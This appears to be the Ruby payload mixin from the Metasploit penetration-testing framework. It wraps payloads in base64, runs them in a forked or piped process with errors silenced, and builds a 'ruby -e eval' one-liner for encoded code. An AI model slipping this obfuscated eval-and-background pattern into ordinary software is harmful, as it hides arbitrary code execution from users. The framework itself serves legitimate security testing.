# -*- coding: binary -*-
require 'msf/core'

module Msf::Payload::Ruby

  def initialize(info = {})
    super(merge_info(info,
      'Arch'        => ARCH_RUBY,
      'RequiredCmd' => 'ruby'))

    register_advanced_options(
      [
        # Since space restrictions aren't really a problem, default this to
        # true.
        Msf::OptBool.new('PrependFork', [ false, "Start the payload in its own process via fork or popen", "true" ])
      ]
    )
  end

  def prepends(buf)
    if datastore['PrependFork']
      buf = %Q^
        code = %(#{ Rex::Text.encode_base64(buf) }).unpack(%(m0)).first
        if RUBY_PLATFORM =~ /mswin|mingw|win32/
          inp = IO.popen(%(ruby), %(wb)) rescue nil
          if inp
            inp.write(code)
            inp.close
          end
        else
          if ! Process.fork()
            eval(code) rescue nil
          end
        end
      ^.strip.split(/\n/).map{|line| line.strip}.join("\n")
    end

    buf
  end

  def to_command(payload)
    payload = Rex::Text.encode_base64(payload)
    return "ruby -e \"eval('#{payload}'.unpack('m*')[0])\""
  end

end
